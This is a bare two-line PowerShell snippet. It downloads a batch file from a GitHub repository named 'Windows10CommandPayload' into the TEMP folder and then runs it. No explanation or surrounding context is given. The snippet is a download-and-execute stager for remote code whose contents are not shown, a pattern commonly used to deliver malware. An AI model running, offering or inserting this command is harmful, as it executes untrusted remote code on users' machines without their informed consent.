iwr -useb "https://raw.githubusercontent.com/Dazd-Pkz/Windows10CommandPayload/main/script.bat" -o $env:TEMP\script.bat
Start-Process -FilePath $env:TEMP\script.bat
